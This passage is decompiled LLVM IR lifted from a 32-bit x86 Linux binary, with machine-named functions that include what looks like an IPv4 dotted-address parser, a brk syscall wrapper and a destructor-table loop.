  %v2_80514ef = phi i32 [ %v1_80514e3, %dec_label_pc_80514ed.preheader ], [ %v1_80514fb, %dec_label_pc_80514ff ]
  %v4_80514ed = phi i32 [ %v2_80514e3, %dec_label_pc_80514ed.preheader ], [ %v0_80514f1, %dec_label_pc_80514ff ]
  %v0_80514ed = phi i32 [ %v0_80514ed.pre, %dec_label_pc_80514ed.preheader ], [ %v1_80514ff, %dec_label_pc_80514ff ]
  %v1_80514ed = inttoptr i32 %v0_80514ed to i8*
  %v2_80514ed = load i8, i8* %v1_80514ed, align 1
  %v3_80514ed = zext i8 %v2_80514ed to i32
  %v5_80514ed = and i32 %v4_80514ed, -256
  %v6_80514ed = or i32 %v3_80514ed, %v5_80514ed
  store i32 %v6_80514ed, i32* %eax.global-to-local, align 4
  %v3_80514ef = inttoptr i32 %v2_80514ef to i8*
  store i8 %v2_80514ed, i8* %v3_80514ef, align 1
  %v0_80514f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80514f1 = trunc i32 %v0_80514f1 to i8
  %v10_80514f1 = icmp eq i8 %v1_80514f1, 10
  %v1_80514f3 = icmp eq i1 %v10_80514f1, false
  br i1 %v1_80514f3, label %dec_label_pc_80514fb, label %dec_label_pc_80514f5

dec_label_pc_80514f5:                             ; preds = %dec_label_pc_80514ed
  %v0_80514f5 = load i32, i32* @edi, align 4
  %v1_80514f5 = add i32 %v0_80514f5, 1
  %v2_80514f5 = inttoptr i32 %v1_80514f5 to i8*
  %v3_80514f5 = load i8, i8* %v2_80514f5, align 1
  %v4_80514f5 = urem i8 %v3_80514f5, 2
  %v5_80514f5 = icmp eq i8 %v4_80514f5, 0
  %v1_80514f9 = icmp eq i1 %v5_80514f5, false
  br i1 %v1_80514f9, label %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge, label %dec_label_pc_80514fb

dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge: ; preds = %dec_label_pc_80514f5
  %v0_8051502.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051502

dec_label_pc_80514fb:                             ; preds = %dec_label_pc_80514f5, %dec_label_pc_80514ed
  %v0_80514fb = load i32, i32* %edx.global-to-local, align 4
  %v1_80514fb = add i32 %v0_80514fb, 1
  store i32 %v1_80514fb, i32* %edx.global-to-local, align 4
  %v0_80514fc = load i32, i32* %ebp.global-to-local, align 4
  %v1_80514fc = add i32 %v0_80514fc, -1
  %v8_80514fc = icmp eq i32 %v1_80514fc, 0
  store i32 %v1_80514fc, i32* %ebp.global-to-local, align 4
  br i1 %v8_80514fc, label %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge, label %dec_label_pc_80514ff

dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge: ; preds = %dec_label_pc_80514fb
  %v1_8051502.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051502

dec_label_pc_80514ff:                             ; preds = %dec_label_pc_80514fb
  %v0_80514ff = load i32, i32* %esi.global-to-local, align 4
  %v1_80514ff = add i32 %v0_80514ff, 1
  store i32 %v1_80514ff, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514ed

dec_label_pc_8051502:                             ; preds = %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge, %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge
  %v1_8051502 = phi i32 [ %v0_80514f5, %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge ], [ %v1_8051502.pre, %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge ]
  %v0_8051502 = phi i32 [ %v0_8051502.pre, %dec_label_pc_80514f5.dec_label_pc_8051502_crit_edge ], [ %v1_80514fb, %dec_label_pc_80514fb.dec_label_pc_8051502_crit_edge ]
  %v2_8051502 = add i32 %v1_8051502, 16
  %v3_8051502 = inttoptr i32 %v2_8051502 to i32*
  store i32 %v0_8051502, i32* %v3_8051502, align 4
  %v0_8051505 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051505 = load i32, i32* @edi, align 4
  %v2_8051505 = add i32 %v1_8051505, 8
  %v3_8051505 = inttoptr i32 %v2_8051505 to i32*
  %v4_8051505 = load i32, i32* %v3_8051505, align 4
  %v5_8051505 = sub i32 %v0_8051505, %v4_8051505
  store i32 %v5_8051505, i32* %edx.global-to-local, align 4
  %v0_8051508 = load i32, i32* @ebx, align 4
  %v2_8051508 = sub i32 %v0_8051508, %v5_8051505
  br label %dec_label_pc_805150a

dec_label_pc_805150a:                             ; preds = %dec_label_pc_80514d9, %dec_label_pc_8051502
  %v4_805150a = phi i32 [ %v2_8051508, %dec_label_pc_8051502 ], [ %v4_805150a.pre, %dec_label_pc_80514d9 ]
  %v5_805150a = sub i32 %arg3, %v4_805150a
  br label %dec_label_pc_805150e

dec_label_pc_805150e:                             ; preds = %dec_label_pc_80514d3, %dec_label_pc_805149c, %dec_label_pc_805150a
  %stack_var_12.0 = phi i32 [ %v5_805150a, %dec_label_pc_805150a ], [ 0, %dec_label_pc_805149c ], [ %arg3, %dec_label_pc_80514d3 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_805149f, i32* @ebx, align 4
  store i32 %v0_805149d, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_80514ff, { 1, 0 }
  uselistorder i32 %v1_80514fc, { 1, 0 }
  uselistorder i32 %v1_80514fb, { 0, 2, 1 }
  uselistorder i32 %v0_80514f1, { 1, 0 }
  uselistorder i32 %v2_80514d5, { 1, 0 }
  uselistorder i32 %v2_80514d3, { 1, 2, 0 }
  uselistorder i32 %v5_80514c7, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 16, { 34, 12, 14, 16, 15, 17, 38, 27, 5, 4, 28, 3, 6, 39, 35, 36, 37, 18, 11, 19, 20, 7, 21, 8, 9, 10, 22, 1, 23, 24, 25, 26, 13, 0, 29, 30, 31, 32, 33, 2 }
  uselistorder i8 2, { 0, 7, 15, 11, 1, 12, 2, 3, 4, 5, 13, 14, 6, 10, 9, 8 }
  uselistorder i32 8, { 79, 80, 17, 86, 18, 87, 19, 23, 25, 24, 32, 26, 27, 33, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 50, 51, 52, 53, 54, 21, 2, 22, 3, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 20, 72, 73, 4, 74, 75, 76, 77, 5, 78, 85, 81, 82, 83, 84, 15, 14, 13, 11, 12, 8, 9, 10, 7, 28, 29, 30, 31, 16, 6 }
  uselistorder i32 (i32, i32*, i32)* @function_804e180, { 1, 0 }
  uselistorder i32 4, { 133, 134, 135, 141, 142, 147, 148, 149, 136, 26, 36, 137, 138, 139, 140, 1, 38, 42, 43, 44, 45, 33, 39, 40, 41, 31, 73, 74, 75, 76, 46, 47, 48, 49, 50, 32, 2, 51, 52, 143, 145, 85, 86, 87, 88, 89, 90, 3, 91, 92, 93, 94, 95, 0, 96, 83, 84, 97, 27, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 13, 118, 119, 121, 120, 4, 53, 144, 146, 5, 25, 24, 54, 55, 23, 56, 57, 58, 59, 21, 22, 60, 34, 61, 16, 62, 17, 18, 19, 20, 63, 64, 65, 66, 67, 68, 6, 69, 70, 71, 72, 77, 14, 7, 78, 8, 28, 29, 35, 79, 30, 80, 81, 9, 15, 10, 11, 82, 12, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 37 }
  uselistorder i32 2147483647, { 1, 0, 2 }
  uselistorder i32* @edi, { 66, 67, 0, 68, 69, 1, 72, 73, 74, 3, 75, 76, 90, 4, 9, 10, 11, 12, 13, 14, 5, 7, 6, 8, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 2, 60, 61, 62, 63, 64, 88, 89, 84, 85, 86, 87, 70, 71, 21, 22, 33, 34, 35, 36, 82, 83, 37, 38, 77, 78, 79, 80, 81, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 39, 65 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_805150e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805150a, { 1, 0 }
  uselistorder label %dec_label_pc_80514ed, { 1, 0 }
}

define i32 @function_8051e00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051e00:
  %v0_8051e00 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8051e13 = inttoptr i32 %arg1 to i16*
  %v4_8051e13 = call i32 @function_804f1b0(i16* %v3_8051e13, i32 %arg2, i32 %arg3)
  %v0_8051e18 = load i32, i32* @esi, align 4
  %v2_8051e18 = add i32 %v0_8051e18, %arg3
  store i32 %v0_8051e00, i32* @esi, align 4
  ret i32 %v2_8051e18

; uselistorder directives
  uselistorder i32 (i16*, i32, i32)* @function_804f1b0, { 0, 3, 1, 4, 2 }
  uselistorder i32* @esi, { 72, 73, 74, 75, 42, 43, 76, 77, 6, 78, 79, 80, 88, 91, 92, 93, 81, 86, 87, 7, 14, 15, 16, 8, 9, 10, 1, 11, 12, 13, 17, 18, 19, 20, 44, 48, 2, 49, 50, 51, 52, 53, 54, 55, 45, 46, 47, 56, 57, 58, 59, 60, 61, 62, 0, 63, 64, 65, 66, 3, 67, 5, 68, 69, 70, 71, 94, 4, 95, 96, 41, 103, 104, 82, 83, 84, 85, 97, 98, 99, 100, 101, 102, 89, 90, 39, 40, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 105 }
}

define i32 @function_8051f58(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051f58:
  %v1_8051f63 = icmp eq i8* %arg1, null
  br i1 %v1_8051f63, label %dec_label_pc_8051fe4, label %dec_label_pc_8051f67

dec_label_pc_8051f67:                             ; preds = %dec_label_pc_8051f58
  %v4_8051f5f = ptrtoint i8* %arg1 to i32
  %v0_8051f75.pre = load i32, i32* @global_var_80551a4, align 4
  br label %dec_label_pc_8051f72

dec_label_pc_8051f72:                             ; preds = %dec_label_pc_8051f67, %dec_label_pc_8051fbb
  %v0_8051fbb = phi i32 [ 0, %dec_label_pc_8051f67 ], [ %v2_8051fc1, %dec_label_pc_8051fbb ]
  %v2_8051fbe = phi i32 [ 1, %dec_label_pc_8051f67 ], [ %v3_8051fbe, %dec_label_pc_8051fbb ]
  %v0_8051f72 = phi i32 [ %v4_8051f5f, %dec_label_pc_8051f67 ], [ %v0_8051f724, %dec_label_pc_8051fbb ]
  %v1_8051f72 = inttoptr i32 %v0_8051f72 to i8*
  %v2_8051f72 = load i8, i8* %v1_8051f72, align 1
  %v3_8051f72 = sext i8 %v2_8051f72 to i32
  %v2_8051f7b = mul nsw i32 %v3_8051f72, 2
  %v3_8051f7b = add i32 %v2_8051f7b, %v0_8051f75.pre
  %v4_8051f7b = inttoptr i32 %v3_8051f7b to i8*
  %v5_8051f7b = load i8, i8* %v4_8051f7b, align 1
  %v6_8051f7b = and i8 %v5_8051f7b, 8
  %v7_8051f7b = icmp eq i8 %v6_8051f7b, 0
  br i1 %v7_8051f7b, label %dec_label_pc_8051fe4, label %dec_label_pc_8051f82

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f72
  %v4_8051f96.pre = load i32, i32* @edx, align 4
  %v2_8051f9635 = load i8, i8* %v1_8051f72, align 1
  %v3_8051f9636 = zext i8 %v2_8051f9635 to i32
  %v5_8051f9637 = and i32 %v4_8051f96.pre, -256
  %v6_8051f9638 = or i32 %v3_8051f9636, %v5_8051f9637
  store i32 %v6_8051f9638, i32* @edx, align 4
  %v2_8051f9839 = sext i8 %v2_8051f9635 to i32
  %v2_8051f9b40 = mul nsw i32 %v2_8051f9839, 2
  %v3_8051f9b41 = add i32 %v2_8051f9b40, %v0_8051f75.pre
  %v4_8051f9b42 = inttoptr i32 %v3_8051f9b41 to i16*
  %v5_8051f9b43 = load i16, i16* %v4_8051f9b42, align 2
  %v2_8051fa045 = and i16 %v5_8051f9b43, 8
  %v3_8051fa046 = icmp eq i16 %v2_8051fa045, 0
  %v1_8051fa247 = icmp eq i1 %v3_8051fa046, false
  br i1 %v1_8051fa247, label %dec_label_pc_8051f86, label %dec_label_pc_8051fa4

dec_label_pc_8051f86:                             ; preds = %dec_label_pc_8051f82, %dec_label_pc_8051f95
  %v2_8051f9851 = phi i32 [ %v2_8051f98, %dec_label_pc_8051f95 ], [ %v2_8051f9839, %dec_label_pc_8051f82 ]
  %v6_8051f9650 = phi i32 [ %v6_8051f96, %dec_label_pc_8051f95 ], [ %v6_8051f9638, %dec_label_pc_8051f82 ]
  %v0_8051f9549 = phi i32 [ %v1_8051f95, %dec_label_pc_8051f95 ], [ %v0_8051f72, %dec_label_pc_8051f82 ]
  %v1_8051f8648 = phi i32 [ %v3_8051f89, %dec_label_pc_8051f95 ], [ 0, %dec_label_pc_8051f82 ]
  %v3_8051f86 = mul i32 %v1_8051f8648, 10
  %v2_8051f89 = add i32 %v3_8051f86, -48
  %v3_8051f89 = add i32 %v2_8051f89, %v2_8051f9851
  %v1_8051f8d = add i32 %v3_8051f89, -255
  %v6_8051f8d = sub i32 254, %v3_8051f89
  %v7_8051f8d = and i32 %v6_8051f8d, %v3_8051f89
  %v8_8051f8d = icmp slt i32 %v7_8051f8d, 0
  %v9_8051f8d = icmp eq i32 %v1_8051f8d, 0
  %v10_8051f8d = icmp slt i32 %v1_8051f8d, 0
  %v3_8051f93 = icmp eq i1 %v10_8051f8d, %v8_8051f8d
  %v4_8051f93 = icmp eq i1 %v9_8051f8d, false
  %v5_8051f93 = and i1 %v4_8051f93, %v3_8051f93
  br i1 %v5_8051f93, label %dec_label_pc_8051fe4, label %dec_label_pc_8051f95

dec_label_pc_8051f95:                             ; preds = %dec_label_pc_8051f86
  %v1_8051f95 = add i32 %v0_8051f9549, 1
  %v1_8051f96 = inttoptr i32 %v1_8051f95 to i8*
  %v2_8051f96 = load i8, i8* %v1_8051f96, align 1
  %v3_8051f96 = zext i8 %v2_8051f96 to i32
  %v5_8051f96 = and i32 %v6_8051f9650, -256
  %v6_8051f96 = or i32 %v3_8051f96, %v5_8051f96
  store i32 %v6_8051f96, i32* @edx, align 4
  %v2_8051f98 = sext i8 %v2_8051f96 to i32
  %v2_8051f9b = mul nsw i32 %v2_8051f98, 2
  %v3_8051f9b = add i32 %v2_8051f9b, %v0_8051f75.pre
  %v4_8051f9b = inttoptr i32 %v3_8051f9b to i16*
  %v5_8051f9b = load i16, i16* %v4_8051f9b, align 2
  %v2_8051fa0 = and i16 %v5_8051f9b, 8
  %v3_8051fa0 = icmp eq i16 %v2_8051fa0, 0
  %v1_8051fa2 = icmp eq i1 %v3_8051fa0, false
  br i1 %v1_8051fa2, label %dec_label_pc_8051f86, label %dec_label_pc_8051fa4

dec_label_pc_8051fa4:                             ; preds = %dec_label_pc_8051f95, %dec_label_pc_8051f82
  %v1_8051f86.lcssa = phi i32 [ 0, %dec_label_pc_8051f82 ], [ %v3_8051f89, %dec_label_pc_8051f95 ]
  %v0_8051f95.lcssa = phi i32 [ %v0_8051f72, %dec_label_pc_8051f82 ], [ %v1_8051f95, %dec_label_pc_8051f95 ]
  %v2_8051f96.lcssa = phi i8 [ %v2_8051f9635, %dec_label_pc_8051f82 ], [ %v2_8051f96, %dec_label_pc_8051f95 ]
  %v6_8051f9b.lcssa.in = phi i16 [ %v5_8051f9b43, %dec_label_pc_8051f82 ], [ %v5_8051f9b, %dec_label_pc_8051f95 ]
  %v8_8051fa4 = sub nsw i32 2, %v2_8051fbe
  %v9_8051fa4 = and i32 %v8_8051fa4, %v2_8051fbe
  %v10_8051fa4 = icmp slt i32 %v9_8051fa4, 0
  %v11_8051fa4 = icmp eq i32 %v2_8051fbe, 3
  %v12_8051fa4 = icmp slt i32 %v2_8051fbe, 3
  %v3_8051fa8 = icmp eq i1 %v12_8051fa4, %v10_8051fa4
  %v4_8051fa8 = icmp eq i1 %v11_8051fa4, false
  %v5_8051fa8 = and i1 %v4_8051fa8, %v3_8051fa8
  br i1 %v5_8051fa8, label %dec_label_pc_8051fb2, label %dec_label_pc_8051faa

dec_label_pc_8051faa:                             ; preds = %dec_label_pc_8051fa4
  %v10_8051faa = icmp eq i8 %v2_8051f96.lcssa, 46
  %v1_8051fad = icmp eq i1 %v10_8051faa, false
  br i1 %v1_8051fad, label %dec_label_pc_8051fe4, label %dec_label_pc_8051faf

dec_label_pc_8051faf:                             ; preds = %dec_label_pc_8051faa
  br label %dec_label_pc_8051fbb

dec_label_pc_8051fb2:                             ; preds = %dec_label_pc_8051fa4
  %v4_8051fb3 = icmp ne i8 %v2_8051f96.lcssa, 0
  %v2_8051fb7 = and i16 %v6_8051f9b.lcssa.in, 32
  %v3_8051fb7 = icmp eq i16 %v2_8051fb7, 0
  %or.cond = and i1 %v4_8051fb3, %v3_8051fb7
  br i1 %or.cond, label %dec_label_pc_8051fe4, label %dec_label_pc_8051fbb

dec_label_pc_8051fbb:                             ; preds = %dec_label_pc_8051fb2, %dec_label_pc_8051faf
  %v0_8051f724 = add i32 %v0_8051f95.lcssa, 1
  %v2_8051fbb = mul i32 %v0_8051fbb, 256
  %v3_8051fbe = add nuw nsw i32 %v2_8051fbe, 1
  %v2_8051fc1 = or i32 %v1_8051f86.lcssa, %v2_8051fbb
  %v7_8051fc7 = icmp sgt i32 %v2_8051fbe, 3
  br i1 %v7_8051fc7, label %dec_label_pc_8051fc9, label %dec_label_pc_8051f72

dec_label_pc_8051fc9:                             ; preds = %dec_label_pc_8051fbb
  %v4_8051fce = icmp eq i32 %arg2, 0
  br i1 %v4_8051fce, label %dec_label_pc_8051fe6, label %dec_label_pc_8051fd5

dec_label_pc_8051fd5:                             ; preds = %dec_label_pc_8051fc9
  %v1_8051fd9 = call i32 @llvm.bswap.i32(i32 %v2_8051fc1)
  %v2_8051fdb = inttoptr i32 %arg2 to i32*
  store i32 %v1_8051fd9, i32* %v2_8051fdb, align 4
  br label %dec_label_pc_8051fe6

dec_label_pc_8051fe4:                             ; preds = %dec_label_pc_8051fb2, %dec_label_pc_8051faa, %dec_label_pc_8051f72, %dec_label_pc_8051f86, %dec_label_pc_8051f58
  br label %dec_label_pc_8051fe6

dec_label_pc_8051fe6:                             ; preds = %dec_label_pc_8051fc9, %dec_label_pc_8051fd5, %dec_label_pc_8051fe4
  %v0_8051feb = phi i32 [ 1, %dec_label_pc_8051fc9 ], [ 1, %dec_label_pc_8051fd5 ], [ 0, %dec_label_pc_8051fe4 ]
  ret i32 %v0_8051feb

; uselistorder directives
  uselistorder i32 %v2_8051f98, { 1, 0 }
  uselistorder i32 %v6_8051f96, { 1, 0 }
  uselistorder i32 %v1_8051f95, { 0, 2, 1 }
  uselistorder i32 %v1_8051f8d, { 1, 0 }
  uselistorder i32 %v3_8051f89, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8051fbe, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_8051f75.pre, { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 1, 0 }
  uselistorder i32 256, { 1, 11, 13, 2, 0, 3, 4, 5, 6, 7, 12, 8, 9, 10 }
  uselistorder i32 3, { 2, 3, 1, 15, 13, 18, 6, 7, 14, 4, 16, 17, 0, 5, 8, 10, 11, 12, 9 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 -48, { 1, 0 }
  uselistorder i32 10, { 2, 5, 8, 4, 6, 0, 7, 9, 10, 3, 1 }
  uselistorder i16 0, { 0, 4, 1, 5, 6, 7, 8, 9, 10, 3, 2 }
  uselistorder i16 8, { 1, 0, 2 }
  uselistorder i32 -256, { 45, 0, 54, 10, 55, 47, 48, 56, 42, 1, 43, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 9, 24, 25, 26, 27, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 44, 6, 46, 52, 49, 2, 50, 3, 51, 7, 53, 8 }
  uselistorder i8 0, { 59, 60, 82, 85, 84, 65, 66, 67, 68, 69, 70, 71, 72, 73, 14, 74, 1, 5, 6, 7, 4, 0, 15, 16, 17, 54, 2, 55, 83, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 13, 46, 47, 48, 49, 50, 51, 52, 53, 56, 57, 58, 8, 61, 62, 3, 63, 9, 64, 75, 77, 76, 10, 78, 79, 12, 80, 11, 81, 23, 18, 19, 20, 21, 22 }
  uselistorder i8 8, { 3, 1, 2, 0 }
  uselistorder i32 2, { 30, 40, 9, 41, 47, 23, 29, 24, 0, 1, 2, 3, 43, 4, 5, 21, 6, 38, 39, 11, 12, 13, 7, 16, 17, 18, 42, 46, 22, 31, 32, 33, 25, 26, 34, 15, 35, 36, 14, 10, 37, 27, 28, 19, 44, 20, 45, 8 }
  uselistorder i8* null, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051fe6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051fe4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8051f86, { 1, 0 }
  uselistorder label %dec_label_pc_8051f72, { 1, 0 }
}

define i32 @function_8051fec(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051fec:
  %v0_8051fef = call i32 @function_804ded8()
  %v0_8051ff4 = load i32, i32* @edx, align 4
  %v4_8051ffb = call i32 @function_804df74(i32 %v0_8051fef, i32 %arg1, i32 %v0_8051ff4, i32 %v0_8051ff4)
  ret i32 %v4_8051ffb

; uselistorder directives
  uselistorder i32* @edx, { 33, 10, 0, 1, 13, 36, 37, 41, 40, 6, 15, 16, 2, 17, 18, 3, 19, 14, 20, 4, 21, 39, 11, 12, 35, 38, 32, 34, 7, 8, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 5, 31, 42 }
}

define i32 @function_8052004() local_unnamed_addr {
dec_label_pc_8052004:
  %v0_8052004 = load i32, i32* @eax, align 4
  %v1_8052004 = add i32 %v0_8052004, 28
  %v2_8052004 = inttoptr i32 %v1_8052004 to i32*
  %v3_8052004 = load i32, i32* %v2_8052004, align 4
  store i32 %v3_8052004, i32* @global_var_805b8b8.101, align 8
  %v1_805200d = add i32 %v0_8052004, 44
  %v2_805200d = inttoptr i32 %v1_805200d to i32*
  %v3_805200d = load i32, i32* %v2_805200d, align 4
  store i32 %v3_805200d, i32* @global_var_805b8bc.102, align 4
  ret i32 %v3_805200d

; uselistorder directives
  uselistorder i32 44, { 7, 0, 4, 6, 5, 1, 2, 3 }
  uselistorder i32 28, { 1, 0, 2 }
}

define i32 @function_8052018(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052018:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052018 = load i32, i32* @ebx, align 4
  store i32 %v0_8052018, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805202b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805202b, i32* @global_var_805b49c.100, align 4
  %v7_8052036 = icmp ult i32 %v1_805202b, %arg1
  %v1_8052038 = icmp eq i1 %v7_8052036, false
  br i1 %v1_8052038, label %dec_label_pc_8052048, label %dec_label_pc_805203a

dec_label_pc_805203a:                             ; preds = %dec_label_pc_8052018
  %v1_805203a = call i32 @function_804e1ec(i32 %v0_8052018)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052042 = inttoptr i32 %v1_805203a to i32*
  store i32 12, i32* %v1_8052042, align 4
  %v0_8052048.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_805204c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052048

dec_label_pc_8052048:                             ; preds = %dec_label_pc_8052018, %dec_label_pc_805203a
  %v2_805204c = phi i32 [ %v0_8052018, %dec_label_pc_8052018 ], [ %v2_805204c.pre, %dec_label_pc_805203a ]
  %v0_8052048 = phi i32 [ 0, %dec_label_pc_8052018 ], [ %v0_8052048.pre, %dec_label_pc_805203a ]
  store i32 %v2_805204c, i32* @ebx, align 4
  ret i32 %v0_8052048

; uselistorder directives
  uselistorder i32 %v1_805202b, { 1, 0 }
  uselistorder i32 12, { 23, 56, 6, 8, 7, 22, 9, 10, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 5, 55, 57, 11, 4, 12, 3, 13, 2, 14, 1, 15, 16, 0, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32)* @function_804e1ec, { 24, 30, 23, 13, 12, 11, 10, 9, 40, 8, 22, 21, 7, 17, 39, 38, 37, 20, 19, 29, 0, 14, 36, 6, 5, 32, 31, 28, 4, 16, 1, 27, 15, 34, 26, 25, 3, 2, 35, 33, 18 }
  uselistorder i32* @global_var_805b49c.100, { 1, 0, 2 }
  uselistorder i32 45, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8052048, { 1, 0 }
}

define i32 @function_8052330() local_unnamed_addr {
dec_label_pc_8052330:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805233c = load i32, i32* @global_var_8055100.88, align 256
  %v10_8052341 = icmp eq i32 %v0_805233c, -1
  br i1 %v10_8052341, label %dec_label_pc_8052352, label %dec_label_pc_8052346.preheader

dec_label_pc_8052346.preheader:                   ; preds = %dec_label_pc_8052330
  br label %dec_label_pc_8052346

dec_label_pc_8052346:                             ; preds = %dec_label_pc_8052346.preheader, %dec_label_pc_8052346
  %v4_8052349 = phi i32 [ %v0_805233c, %dec_label_pc_8052346.preheader ], [ %v2_805234b, %dec_label_pc_8052346 ]
  %v0_8052346 = phi i32 [ ptrtoint (i32* @global_var_8055100.88 to i32), %dec_label_pc_8052346.preheader ], [ %v1_8052346, %dec_label_pc_8052346 ]
  %v1_8052346 = add i32 %v0_8052346, -4
  call void @__pseudo_call(i32 %v4_8052349)
  %v1_805234b = inttoptr i32 %v1_8052346 to i32*
  %v2_805234b = load i32, i32* %v1_805234b, align 4
  %v10_805234d = icmp eq i32 %v2_805234b, -1
  %v1_8052350 = icmp eq i1 %v10_805234d, false
  br i1 %v1_8052350, label %dec_label_pc_8052346, label %dec_label_pc_8052352.loopexit

dec_label_pc_8052352.loopexit:                    ; preds = %dec_label_pc_8052346
  %v2_8052352.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052352

dec_label_pc_8052352:                             ; preds = %dec_label_pc_8052352.loopexit, %dec_label_pc_8052330
  %v2_8052352 = phi i32 [ %v2_8052352.pre, %dec_label_pc_8052352.loopexit ], [ %tmp6, %dec_label_pc_8052330 ]
  ret i32 %v2_8052352

; uselistorder directives
  uselistorder i32 %v0_805233c, { 1, 0 }
  uselistorder i1 false, { 173, 129, 112, 113, 115, 114, 0, 174, 175, 18, 130, 131, 132, 189, 190, 191, 192, 195, 19, 196, 197, 194, 188, 176, 42, 177, 178, 43, 20, 44, 45, 74, 46, 181, 182, 183, 2, 184, 185, 186, 187, 1, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 133, 146, 147, 148, 11, 149, 150, 16, 152, 151, 155, 153, 154, 12, 21, 156, 157, 120, 193, 100, 101, 102, 103, 105, 104, 22, 106, 107, 3, 108, 179, 23, 180, 4, 123, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 5, 73, 24, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 35, 86, 87, 13, 88, 14, 34, 89, 90, 91, 92, 93, 94, 95, 96, 97, 33, 98, 6, 7, 8, 36, 37, 99, 9, 110, 109, 10, 111, 25, 116, 117, 118, 26, 119, 17, 121, 122, 124, 125, 38, 126, 127, 128, 166, 158, 159, 160, 161, 162, 163, 164, 165, 27, 167, 28, 168, 39, 31, 169, 30, 40, 15, 170, 29, 171, 172, 41, 32 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 6, 7, 20, 21, 22, 23, 25, 26, 27, 28, 2, 29, 0, 24, 30, 31, 32, 33, 34, 35, 4, 8, 9, 10, 11, 3, 12, 13, 14, 15, 16, 17, 5, 1, 18, 19 }
  uselistorder i32 ptrtoint (i32* @global_var_8055100.88 to i32), { 0, 2, 3, 4, 5, 1 }
